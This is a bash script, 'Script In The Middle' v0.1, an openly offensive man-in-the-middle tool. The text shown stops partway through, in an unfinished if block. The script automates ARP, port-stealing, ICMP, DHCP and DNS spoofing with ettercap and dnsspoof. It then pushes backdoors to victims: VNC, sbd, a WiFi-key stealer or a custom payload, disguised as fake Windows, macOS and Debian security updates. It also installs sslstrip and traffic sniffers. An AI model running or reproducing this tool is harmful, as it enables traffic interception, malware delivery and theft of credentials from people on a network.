#!/bin/bash
#----------------------------------------------------------------------------------------------#
#sitm.sh v0.1 (#1 2010-09-28)                                                                  #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Credits------------------------------------------------------------------------------------#
# VNC ~ TightVNC, TightVNC Group         ~ http://www.tightvnc.com                             #
# WKV ~ Wireless Key View, Nir Sofer     ~ http://www.nirsoft.net/utils/wireless_key.html      #
# SBD ~ Secure Backdoor, Michel Blomgren ~ http://tigerteam.se/dl/sbd                          #
#---Important----------------------------------------------------------------------------------#
# Make sure to copy "www". Example: cp -rf www/* /var/www/sitm                                 #
# The VNC password is "g0tmi1k" (without "")                                                   #
#                                                                                              #
#                     *** Do NOT use this for illegal or malicious use ***                     #
#              The programs are provided as is without any guarantees or warranty.             #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces to use
interface="eth0"

# [normal/transparent/dead/flip] normal=Doesn't force, just sniff. transparent=after been infected gives target internet aftwards. dead=No internet access afterwards. flip=flips all the images
mode="normal"

# [arp/port/icmp/dhcp/dns] Attack method. See help for info
attack="arp"

# [sbd/vnc/wkv/autopwn/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys. [/path/to/file] if payload is set to other, use this
payload="vnc"
backdoorPath="/root/backdoor.exe"

# [/path/to/folder/] The directory location to the crafted web page.
www="/var/www/sitm/"

# [random/set/false] Change the MAC address
macMode="false"
fakeMac="00:05:7c:9a:58:3f"

 # [true/false] Runs 'extra' programs after the attack
extras="true"

#---Variables----------------------------------------------------------------------------------#
diagnostics="false"                    # Creates a output file displays exactly whats going on
    verbose="0"                        # Shows more info. 0=normal, 1=more , 2=more+commands
       port=$(shuf -i 2000-65000 -n 1) # Random port each time
        www="${www%/}"                 # Remove trailing slash
     target=""                         # null the value
displayMore="false"                    # Gives more details on whats happening
      debug="false"                    # Doesn't delete files, shows more on screen etc
    logFile="sitm.log"                 # Filename of output
        svn="21"                       # SVN Number
    version="0.1 (#1)"                 # Program version
trap 'cleanUp interrupt' 2             # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action title command #screen&file #x|y|lines #hold
   if [ "$debug" == "true" ]; then display diag "action~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi # Coding error
   if [ ! -z "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ]; then error="3"; fi # Coding error
   if [ ! -z "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ]; then error="5"; fi # Coding error

   if [ "$error" == "free" ]; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$5" == "true" ]; then xterm="$xterm -hold"; fi
      if [ "$verbose" == "2" ]; then echo "Command: $command"; fi
      if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ]; then command="$command | tee -a $logFile"; fi
      if [ ! -z "$4" ]; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      if [ "$debug" == "true" ]; then display diag "$xterm -geometry 87x$lines+$x+$y -T \"sitm v$version - $1\" \"$command\""; fi
      $xterm -geometry 87x$lines+$x+$y -T "sitm v$version - $1" "$command"
      return 0
   else
      display error "action. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile
      return 1
   fi
}
function cleanUp() { #cleanUp #mode
   if [ "$debug" == "true" ]; then display diag "cleanUp~$@"; fi
   if [ "$1" == "nonuser" ]; then exit 3;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      echo # Blank line
      if [ "$displayMore" == "true" ]; then display info "*** BREAK ***"; fi # User quit
      action "Killing xterm" "killall xterm"
   fi

   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$mode" == "non" ]; then # Else will will remove their internet access!
         if [ "$displayMore" == "true" ]; then display action "Restoring: Network"; fi
         echo "0" > /proc/sys/net/ipv4/ip_forward
         #echo "0" > /proc/sys/net/ipv4/conf/$interface/forwarding
      fi
      if [ -e "/etc/etter.conf.bkup" ]; then action "Restoring ettercap" "mv -f /etc/etter.conf.bkup /etc/etter.conf"; fi
   fi

   if [ "$debug" != "true" ] || [ "$1" == "remove" ]; then
      if [ "$displayMore" == "true" ]; then display action "Removing: Temp files"; fi
      command="/tmp/sitm*"
      if [ -e "$www/kernel_1.83.90-5+lenny2_i386.deb" ]; then command="$command $www/kernel_1.83.90-5+lenny2_i386.deb"; fi
      if [ -e "$www/SecurityUpdate1-83-90-5.dmg.bin" ]; then command="$command $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
      if [ -e "$www/Windows-KB183905-x86-ENU.exe" ]; then command="$command $www/Windows-KB183905-x86-ENU.exe"; fi
      action "Removing temp files" "rm -rfv $command"

      if [ -d "$www/images" ]; then action "Removing temp files" "rm -rf $www/images"; fi

      if [ -e "/etc/apache2/sites-available/sitm" ]; then action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite sitm && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop; rm /etc/apache2/sites-available/sitm"; fi # We may want to give apahce running when in "non" mode. - to show a different page!
   fi

   if [ "$1" != "remove" ]; then
      if [ "$diagnostics" == "true" ]; then echo -e "End @ $(date)" >> $logFile; fi
      echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
      exit 0
   fi
}
function display() { #display type message
   if [ "$debug" == "true" ]; then display diag "display~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ]; then error="2"; fi # Coding error

   if [ "$error" == "free" ]; then
      output=""
      if [ "$1" == "action" ]; then output="\e[01;32m[>]\e[00m"
      elif [ "$1" == "info" ]; then output="\e[01;33m[i]\e[00m"
      elif [ "$1" == "diag" ]; then output="\e[01;34m[+]\e[00m"
      elif [ "$1" == "error" ]; then output="\e[01;31m[!]\e[00m"; fi
      output="$output $2"
      echo -e "$output"

      if [ "$diagnostics" == "true" ]; then
         if [ "$1" == "action" ]; then output="[>]"
         elif [ "$1" == "info" ]; then output="[i]"
         elif [ "$1" == "diag" ]; then output="[+]"
         elif [ "$1" == "error" ]; then output="[!]"; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: display (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
}
function help() { #help
   if [ "$debug" == "true" ]; then display diag "help~$@"; fi
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash sitm.sh -i [interface] -t [IP] -a [attack] -m [normal/transparent/non/flip]
                -p [sbd/vnc/wkv/autopwn/other] -b [/path/to/file]
                -h [/path/to/folder/] (-z / -s [MAC]) -x -d (-v / -V) ([-u] / [-?])


 Options:
   -i [interface]                    ---  interface e.g. $interface
   -t [IP]                           ---  Target IP e.g. 192.168.1.101

   -a [arp/port/icmp/dhcp/dns]       ---  Attack method e.g. $attack
   -m [normal/transparent/non/flip]  ---  Mode. How should the access point behave
                                             e.g. non
   -p  [sbd/vnc/wkv/autopwn/other]   ---  Payload. What do you want to do to the target
                                             e.g. vnc
   -b [/path/to/file]                ---  Backdoor Path (only used when payload is set to other)
                                             e.g. /path/to/backdoor.exe

   -h [/path/to/folder/]              ---  htdocs (www) path e.g. $www

   -z [random/set/false]             ---  Change the access points's MAC Address e.g. $macMode
   -s [MAC]                          ---  Use this MAC Address e.g. $fakeMac

   -x                                ---  Does a few \"extra\" things after target is infected.

   -d                                ---  Diagnostics      (Creates output file, $logFile)
   -v                                ---  Verbose          (Displays more)
   -V                                ---  (Higher) Verbose (Displays more + shows commands)

   -u                                ---  Checks for an update
   -?                                ---  This screen


 Example:
   bash sitm.sh
   bash sitm.sh -i 192.168.1.156 -a dhcp -i wlan1 -v
   bash sitm.sh -i 192.168.1.26 -flip -V


 Types of attaks:
   -ARP
        ARP requests/replies are sent to the victims to poison their ARP cache.
        Once the cache has been poisoned the victims will send all packets to the attacker which, in turn, can modify and forward them to the real destination.

   -Port Stealing
        The term \"Port Stealing\" refers to the MITM technique used to spoof the switch forwarding database (FDB) and usurp the switch port of the victim host for packet sniffing on Layer 2 switched networks.
        The attacker starts by flooding the switch with the forged ARP packets that contain the same source MAC address as that of the victim host and the same destination MAC address as that of the attacker host.
        Note that those packets are invisible to other host on the same network.
        Now that the victim host also sends packets to the switch at the same time, the switch will receive packets containing the same source MAC address with two different ports.
        Therefore, the switch will repeatedly alter the MAC address binding to either of the two ports by referencing the relevant information in the packets.
        If the attacker's packets are faster, the switch will send the attacker the packets intended for the victim host.
        Then the attacker sniffs the received packet, stops flooding and sends an ARP request for the victim’s IP address.
        After receiving the ARP reply from the victim host, the attacker will manage to forward the \"stolen\" packet to the victim host.
        Finally, the flooding is launched again for another attacking cycle.

        It floods the LAN (based on port_steal_delay option in etter.conf) with ARP packets.
        If you don’t specify the \"tree\" option, the destination MAC address of each \"stealing\" packet is the same as the attacker’s one (other NICs won’t see these packets), the source MAC address will be one of the MACs in the host list.
        This process \"steals\" the switch port of each victim host in the host list.
        Using low delays, packets destined to \"stolen\" MAC addresses will be received by the attacker, winning the race condition with the real port owner.
        When the attacker receives packets for \"stolen\" hosts, it stops the flooding process and performs an ARP request for the real destination of the packet.
        When it receives the ARP reply it’s sure that the victim has \"taken back\" his port, so ettercap can re-send the packet to the destination as is.
        Now we can re-start the flooding process waiting for new packets.

   -ICMP
        It sends a spoofed icmp redirect message to the hosts in the LAN pretending to be a better route for internet.
        All connections to internet will be redirected to the attacker which, in turn, will forward them to the real gateway.
        The resulting attack is a HALF-DUPLEX mitm.
        Only the client is redirected, since the gateway will not accept redirect messages for a directly connected network.
        Obviously you have to be able to sniff all the traffic. If you are on a switch you have to use a different mitm attack such as arp poisoning.

   -DHCP
        It pretends to be a DHCP server and tries to win the race condition with the real one to force the client to accept the attacker’s reply.
        This way the attacker is able to manipulate the GW parameter and hijack all the outgoing traffic generated by the clients.
        The attacker can intercept DHCP traffic and can spoof the DHCP response parameters and can assign any dead gateway IP to the victim to do a DOS attack or can simply assign his/her IP address as gateway and can intercept all traffic between any host and the victim
        The resulting attack is a HALF-DUPLEX mitm.
        When the attack is stop, all the victims will be still convinced that the attacker is the gateway until the lease expires!
        If a IP that is already in use, it will mess the network! In general, use this attack carefully. It can really mess things up!

   -DNS
        The attacker starts by sniffing the ID of any DNS request, and then replies to the target requests before the real DNS server.



 Known issues:
   -Can't Attack (ARP)
        > Static ARP tables - use a different type. E.g. Port or ICMP
"
   exit 1
}
function update() { #update
   if [ "$debug" == "true" ]; then display diag "update~$@"; fi
   display action "Checking for an update"
   if [ -e "/usr/bin/svn" ]; then
      command=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/sitm/ | grep "Last Changed Rev:" | cut -c19-)
      if [ "$command" != "$svn" ]; then
         display info "Updating"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/sitm/sitm.sh" "sitm.sh"
         svn export -q --force "http://g0tmi1k.googlecode.com/svn/trunk/sitm/www/" "$www/"
         display info "Updated to $command. (="
      else
         display info "You're using the latest version. (="
      fi
   else
      command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" |  awk -F " " '{split ($4,A,":"); print A[1]}')
      if [ "$command" != "$svn" ]; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/sitm/sitm.sh"
         wget -q -N -P "$www/" "http://g0tmi1k.googlecode.com/svn/trunk/sitm/www/index.php"
         wget -q -N -P "$www/" "http://g0tmi1k.googlecode.com/svn/trunk/sitm/www/vnc.reg"
         display info "Updated! (="
      else
         display info "You're using the latest version. (="
      fi
   fi
   echo
   exit 2
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m Script In The Middle (SITM) v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanUp nonuser; fi

#----------------------------------------------------------------------------------------------#
while getopts "t:a:i:m:p:b:h:z:s:xdvVu?" OPTIONS; do
   case ${OPTIONS} in
      t ) target=$OPTARG;;
      a ) attack=$OPTARG;;
      i ) interface=$OPTARG;;
      m ) mode=$OPTARG;;
      p ) payload=$OPTARG;;
      b ) backdoorPath=$OPTARG;;
      h ) www=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) extras="true";;
      d ) diagnostics="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option";;   # Default
   esac
done
gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
broadcast=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
networkmask=$(ifconfig $interface | awk '/Mask/ {split ($4,A,":"); print A[2]}')

#----------------------------------------------------------------------------------------------#
#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
   displayMore="true"
   if [ "$debug" == "true" ]; then
      display info "Debug mode"
   fi
   if [ "$diagnostics" == "true" ]; then
      display diag "Diagnostics mode"
      echo -e "sitm v$version\nStart @ $(date)" > $logFile
      echo "sitm.sh" $* >> $logFile
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ]; then display error "interface can't be blank" 1>&2; cleanUp; fi
if [ "$attack" != "arp" ] && [ "$attack" != "port" ] && [ "$attack" != "icmp" ] && [ "$attack" != "dhcp" ] && [ "$attack" != "dns" ]; then display error "attack ($attack) isn't correct" 1>&2; cleanUp; fi
if [ "$mode" != "normal" ] && [ "$mode" != "transparent" ] && [ "$mode" != "non" ] && [ "$mode" != "flip" ]; then display error "mode ($mode) isn't correct" 1>&2; cleanUp; fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   if [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ]; then display error "payload ($payload) isn't correct" 1>&2; cleanUp; fi
   if [ "$payload" == "other" ] && [ -z "$backdoorPath" ]; then display error "backdoorPath can't be blank" 1>&2; cleanUp; fi
   if [ "$payload" == "other" ] && [ ! -e "$backdoorPath" ]; then display error "There isn't a backdoor at $backdoorPath" 1>&2; cleanUp; fi
fi
if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ]; then display error "macMode ($macMode) isn't correct" 1>&2; macMode="false"; fi
if [ "$macMode" == "set" ] && ([ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ]); then display error "fakeMac ($fakeMac) isn't correct" 1>&2; macMode="false"; fi
if [ "$mode" != "non" ]; then
   if [ "$extras" != "true" ] && [ "$extras" != "false" ]; then display error "extras ($extras) isn't correct" 1>&2; extras="false"; fi
   if [ -z "$gateway" ]; then display error "gateway ($gateway) isn't correct. Using the correct interface?" 1>&2; cleanUp; fi # Scan? for interface in $ifconfig - awk !/$interface/" do check ping blah
   if [ -z "$ourIP" ]; then display error "ourIP ($ourIP) isn't correct" 1>&2; cleanUp; fi
fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] && [ -z "$port" ]; then display error "port ($port) isn't correct" 1>&2; port="4567"; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then display error "verbose ($verbose) isn't correct" 1>&2; verbose="0"; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then display error "debug ($debug) isn't correct" 1>&2; debug="true"; fi # Something up... Find out what!
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ]; then display error "diagnostics ($diagnostics) isn't correct" 1>&2; diagnostics="false"; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ]; then display error "logFile ($logFile) isn't correct" 1>&2; logFile="sitm.log"; fi

#for item in "foo" "bar"; do
#   if [ -z "$item" ]; then display error "$item can't be blank" 1>&2; cleanUp; fi
#done

#----------------------------------------------------------------------------------------------#
if [ -z "$target" ] && [ "$attack" != "dhcp" ]; then
   if [ ! -e "/usr/bin/nmap" ]; then
      display error "Nmap isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install nmap" "apt-get -y install nmap"; fi
      if [ ! -e "/usr/bin/nmap" ]; then
         display error "Failed to install nmap" 1>&2; cleanUp
      else
         display info "Installed: nmap"
      fi
   fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ]; then display action "Scanning: Targets"; fi
   loopMain="false"
   while [ "$loopMain" != "true" ]; do
      ip4="${ourIP##*.}"; x="${ourIP%.*}"
      ip3="${x##*.}"; x="${x%.*}"
      ip2="${x##*.}"; x="${x%.*}"
      ip1="${x##*.}"
      nm4="${networkmask##*.}"; x="${networkmask%.*}"
      nm3="${x##*.}"; x="${x%.*}"
      nm2="${x##*.}"; x="${x%.*}"
      nm1="${x##*.}"
      let sn1="$ip1&$nm1"
      let sn2="$ip2&$nm2"
      let sn3="$ip3&$nm3"
      let sn4="$ip1&$nm4"
      let en1="$ip1|(255-$nm1)"
      let en2="$ip2|(255-$nm2)"
      let en3="$ip3|(255-$nm3)"
      let en4="$ip4|(255-$nm4)"
      subnet=$sn1.$sn2.$sn3.$sn4
      endnet=$en1.$en2.$en3.$en4
      oldIFS=$IFS; IFS=.
      for dec in $networkmask; do
         case $dec in
            255) let nbits+=8;;
            254) let nbits+=7;;
            252) let nbits+=6;;
            248) let nbits+=5;;
            240) let nbits+=4;;
            224) let nbits+=3;;
            192) let nbits+=2;;
            128) let nbits+=1;;
            0);;
            *) display error "Bad input: dec ($dec)" 1>&2; cleanUp
          esac
      done
      IFS=$oldIFS
      action "Scanning Targets" "nmap $subnet/$nbits -e $interface -n -sP -sn | tee /tmp/sitm.tmp" #-O -oX sitm.nmap.xml
      echo -e " Num |        IP       |       MAC       |     Hostname    |   OS  \n-----|-----------------|-----------------|-----------------|--------"
      arrayTarget=( $(cat "/tmp/sitm.tmp" | grep "Nmap scan report for" | grep -v "host down" |  sed 's/Nmap scan report for //') )
      i="0"
      for targets in "${arrayTarget[@]}"; do
         printf "  %-2s | %-15s | %-15s | %-15s | %-10s\n" "$(($i+1))" "${arrayTarget[${i}]}"
         i=$(($i+1))
      done
      echo "  $(($i+1))  | $broadcast   | *Everyone*"
      loopSub="false"
      while [ "$loopSub" != "true" ]; do
         read -p "[~] re[s]can, [m]anual, e[x]it or select num: "
         if [ "$REPLY" == "x" ]; then cleanUp clean
         elif [ "$REPLY" == "m" ]; then read -p "[~] IP address: "; target="$REPLY" loopSub="true"; loopMain="true"
         elif [ "$REPLY" == "s" ]; then loopSub="true"
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ]; then display error "Bad input" 1>&2
         elif [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$i" ]; then display error "Incorrect number" 1>&2
         else target=${arrayTarget[$(($REPLY-1))]}; loopSub="true"; loopMain="true"
         fi
      done
   done
fi

IP_ADDR_VAL=$(echo "$target" | grep -Ec '^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])')
if [ $IP_ADDR_VAL -eq 0 ]; then
   display error "Bad IP"  $diagnostics 1>&2
   target=$(ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}')
   display info "Setting target IP: $target (Broadcast for $interface)"
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then
   echo "-Settings------------------------------------------------------------------------------------
           target=$target
           attack=$attack
        interface=$interface
             mode=$mode
          payload=$payload
     backdoorPath=$backdoorPath
              www=$www
          macMode=$macMode
          fakeMac=$fakeMac
           extras=$extras
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
          gateway=$gateway
            ourIP=$ourIP
             port=$port
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernel"
   uname -a >> $logFile
   display diag "Detecting: Hardware"
   echo "-lspci-----------------------------------" >> $logFile
   lspci -knn >> $logFile
   echo "-lsmod-----------------------------------" >> $logFile
   lsmod >> $logFile
   display diag "Testing: Network"
   echo "-ifconfig--------------------------------" >> $logFile
   ifconfig >> $logFile
   echo "-ifconfig -a-----------------------------" >> $logFile
   ifconfig -a >> $logFile
   echo "-route -n--------------------------------" >> $logFile
   route -n >> $logFile
   if [ "$mode" != "non" ]; then
      echo "-Ping------------------------------------" >> $logFile
      action "Ping" "ping -I $interface -c 4 $ourIP"
      action "Ping" "ping -I $interface -c 4 $gateway"
   fi
fi
if [ "$displayMore" == "true" ]; then display diag "Testing: Internet connection"; fi
command=$(ping -I $interface -c 1 google.com >/dev/null)
if ! eval $command; then
   display error "Internet access: Failed"
   display info "Switching mode: non"
   mode="non"
   if [ "$diagnostics" == "true" ]; then echo "--> Internet access: Failed" >> $logFile; fi
else
   if [ "$diagnostics" == "true" ]; then echo "--> Internet access: Okay" >> $logFile; fi
fi
if [ "$verbose" != "0" ] || [ "$debug" == "true" ]; then # if [ "$displayMore" == "true" ]
    display info "         target=$target
\e[01;33m[i]\e[00m          attack=$attack
\e[01;33m[i]\e[00m       interface=$interface
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m              www=$www
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m          gateway=$gateway
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/bin/macchanger" ] && [ "$macMode" != "false" ]; then
   display error "macchanger isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install macchanger" "apt-get -y install macchanger"; fi
   if [ ! -e "/usr/bin/macchanger" ]; then
      display error "Failed to install macchanger" 1>&2; cleanUp
   else
      display info "Installed: macchanger"
   fi
fi
if [ ! -e "/usr/sbin/ettercap" ]; then
   display error "ettercap isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install ettercap" "apt-get -y install ettercap ettercap-gtk ettercap-common"; fi
   if [ ! -e "/usr/sbin/ettercap" ]; then
      display error "Failed to install ettercap" 1>&2; cleanUp
   else
      display info "Installed: ettercap"
   fi
fi
if [ ! -e "/usr/sbin/dnsspoof" ] && [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   display error "dnsspoof isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install dnsspoof" "apt-get -y install dsniff"; fi
   if [ ! -e "/usr/sbin/dnsspoof" ]; then
      display error "Failed to install dnsspoof" 1>&2; cleanUp
   else
      display info "Installed: dnsspoof"
   fi
fi
if [ ! -e "/usr/sbin/apache2" ] && [ ! -e "/usr/lib/php5" ] && [ "$mode" != "normal" ]; then
   display error "apache2 isn't installed"
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install apache2 php5" "apt-get -y install apache2 php5"; fi
   if [ ! -e "/usr/sbin/apache2" ]; then
      display error "Failed to install apache2" 1>&2; cleanUp
   else
      display info "Installed: apache2 & php5"
   fi
fi
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   if [ ! -e "/opt/metasploit3/bin/msfconsole" ]; then
      display error "Metasploit isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install metasploit" "apt-get -y install framework3"; fi
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ]; then action "Install metasploit" "apt-get -y install metasploit"; fi
      if [ ! -e "/opt/metasploit3/bin/msfconsole" ]; then
         display error "Failed to install metasploit" 1>&2; cleanUp
      else
         display info "Installed: metasploit"
      fi
   fi
   if [ "$payload" == "sbd" ] && [ ! -e "/usr/local/bin/sbd" ]; then
      display error "sbd isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install sbd" "apt-get -y install sbd";  fi
      if [ ! -e "/usr/local/bin/sbd" ]; then
         display error "Failed to install sbd" 1>&2; cleanUp
      else
         display info "Installed: sbd"
      fi
   elif [ "$payload" == "vnc" ] && [ ! -e "/usr/bin/vncviewer" ]; then
      display error "vnc isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install vnc" "apt-get -y install vnc"; fi
      if [ ! -e "/usr/bin/vncviewer" ]; then
         display error "Failed to install vnc" 1>&2; cleanUp
      else
         display info "Installed: vnc"
      fi
   elif [ "$payload" == "wkv" ]; then
      if [ ! -e "$www/wkv-x86.exe" ]; then display error "There isn't a wkv-x86.exe at $www/wkv-x86.exe" 1>&2; cleanUp; fi
      if [ ! -e "$www/wkv-x64.exe" ]; then display error "There isn't a wkv-x64.exe at $www/wkv-x64.exe" 1>&2; cleanUp; fi
   elif [ "$payload" == "other" ]; then
      if [ ! -e "$backdoorPath" ]; then display error "There isn't a backdoor at $backdoorPath" 1>&2; cleanUp; fi
   fi
fi
if [ "$mode" == "flip" ]; then
   if [ ! -e "/usr/sbin/squid" ]; then
      display error "squid isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install squid" "apt-get -y install squid";  fi
      if [ ! -e "/usr/sbin/squid" ]; then
         display error "Failed to install squid" 1>&2; cleanUp
      else
         display info "Installed: squid"
      fi
   fi
   if [ ! -e "/usr/bin/mogrify" ]; then
      display error "mogrify isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install mogrify" "apt-get -y install imagemagick";  fi
      if [ ! -e "/usr/sbin/squid" ]; then
         display error "Failed to install mogrify" 1>&2; cleanUp
      else
         display info "Installed: mogrify"
      fi
   fi
fi
if [ "$extras" == "true" ]; then
   if [ ! -e "/usr/bin/imsniff" ]; then
      display error "imsniff isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install imsniff" "apt-get -y install imsniff"; fi
      if [ ! -e "/usr/bin/imsniff" ]; then
         display error "Failed to install imsniff" 1>&2; cleanUp
      else
         display info "Installed: imsniff"
      fi
   fi
   if [ ! -e "/usr/bin/driftnet" ]; then
      display error "driftnet isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "Install driftnet" "apt-get -y install driftnet"; fi
      if [ ! -e "/usr/bin/driftnet" ]; then
         display error "Failed to install driftnet" 1>&2; cleanUp
      else
         display info "Installed: driftnet"
      fi
   fi
   if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ]; then
      display error "sslstrip isn't installed"
      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
      if [[ "$REPLY" =~ ^[Yy]$ ]]; then action "wget -P /tmp http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz && tar -C /tmp -xvf /tmp/sslstrip-0.7.tar.gz && rm /tmp/sslstrip-0.7.tar.gz && mkdir -p /pentest/spoofing/sslstrip/ && mv -f /tmp/sslstrip-0.7/* /pentest/spoofing/sslstrip/ && rm -rf /tmp/sslstrip-0.7"; fi
      if [ ! -e "/pentest/spoofing/sslstrip/sslstrip.py" ]; then
         display error "Failed to install sslstrip" 1>&2; cleanUp
      else
         display info "Installed: sslstrip"
      fi
   fi
fi

if [ ! -e "$www/index.php" ]; then
   if [ ! -d "$www/" ]; then
